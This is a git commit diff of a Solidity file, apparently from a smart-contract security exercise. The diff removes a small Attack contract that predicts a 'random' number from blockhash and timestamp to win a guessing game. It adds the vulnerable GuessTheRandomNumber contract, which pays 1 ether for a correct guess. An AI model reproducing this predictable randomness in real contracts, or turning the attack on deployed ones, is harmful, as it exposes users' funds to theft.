8839d20ba7857166fe34a833401f030081fddf39
RonexLemon <ronexondimu@gmail.com>
2023-04-14 18:59:53 +0300

    modify random contract

--- Randomness/RanndomNumber.sol
+++ Randomness/RanndomNumber.sol
@@ -1,22 +1,25 @@
 //SPDX-License-Identifier:MIT
 pragma solidity ^0.8.2;
-interface GuessTheRandomNumber{
-    function guess(uint _guess)external;
-}
-contract Attack{
- GuessTheRandomNumber  Random;
-    constructor(address target){
-        Random = GuessTheRandomNumber(target);
+contract GuessTheRandomNumber {
+    constructor() payable {}
 
-    }
-    function guess()public {
-       uint answer = uint(
+    function guess(uint _guess) public returns (bool) {
+        uint answer = uint(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         );
-        Random.guess(answer);
-       
-    }
-    receive() external payable{}
-    fallback() external payable{}
+        
 
+        if (_guess == answer) {
+            (bool sent, ) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send Ether");
+        }
+return(false);
+    }
+    function getAnswer()public view returns(uint){
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
+        return  answer;
+    }
 }
+
